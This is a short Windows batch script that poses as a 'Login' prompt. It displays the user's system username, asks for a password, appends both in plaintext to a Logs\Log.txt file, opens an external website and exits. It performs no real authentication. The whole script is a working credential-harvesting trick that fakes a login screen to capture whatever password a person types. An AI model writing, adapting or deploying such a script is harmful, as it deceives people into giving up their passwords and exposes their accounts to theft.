@echo off
color a
title Login
cls
echo Your system username is: %USERNAME%
echo.
echo Please Enter Your Password
echo.
cd "Logs"
set /p pass=Password:
echo Username="%USERNAME%" Password="%pass%" >> Log.txt
start ""
start "" https://anshinfotech.org/
cls
exit
